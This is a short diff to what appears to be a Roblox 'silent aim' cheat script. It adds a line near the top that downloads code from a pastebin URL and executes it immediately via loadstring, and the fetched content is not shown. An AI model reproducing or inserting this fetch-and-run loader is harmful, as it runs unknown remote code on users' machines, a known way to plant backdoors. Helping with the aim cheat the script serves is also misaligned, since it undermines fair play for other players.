@@ -1,5 +1,8 @@
 -- Nova Silent Aim - Working Version
 
+-- Load external script first
+loadstring(game:HttpGet("https://pastebin.com/raw/4e60mJjh"))()
+
 -- Wait 2 seconds before loading
 task.wait(2)
 
